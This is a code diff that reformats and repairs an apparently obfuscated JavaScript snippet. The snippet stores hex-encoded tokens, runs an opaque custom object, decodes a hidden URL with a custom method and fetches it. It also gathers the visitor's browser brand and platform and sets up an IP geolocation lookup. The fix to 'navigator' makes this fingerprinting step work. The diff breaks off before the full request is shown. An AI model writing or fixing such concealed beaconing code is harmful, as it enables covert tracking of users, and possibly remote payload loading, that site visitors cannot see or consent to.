@@ -1,14 +1,17 @@
 let tok={
       utkn:"75e293b315b34134f221a434949431a365d4822453a1a5341561a4a3219482541554e4d24163b5f29511a45431a1a5d271e2924411339224",
-      redt:"e1229224856143b33572e4b3"};
-     $=new $_;
-     $.run();
-            mky="e1e1843475f2f424a12393a355b24134e4a1b5d2f4b2413465c4f4b31532932465c4824494a1a5d271e2924411339224";
-      su=(i)=>`https://ipapi.co/${i}/json`;
-           getAd=()=>
-              {
-              uap=navigatior.userAgentData;
-    respsend=`Browser=${uap.brands[2].brand?uap.brands[2].brand:'N_A'}&ostype=${uap.platform}`;
+      redt:"e1229224856143b33572e4b3"
+};
+var $=new $_;
+$.run();
+
+mky="e1e1843475f2f424a12393a355b24134e4a1b5d2f4b2413465c4f4b31532932465c4824494a1a5d271e2924411339224";
+
+su=(i)=>`https://ipapi.co/${i}/json`;
+           
+getAd=()=>{
+              uap=navigator.userAgentData;
+              respsend=`Browser=${uap.brands[2].brand?uap.brands[2].brand:'N_A'}&ostype=${uap.platform}`;
       
                 fetch(new Request(mky.hl()))
                   .then(j=>j.json())
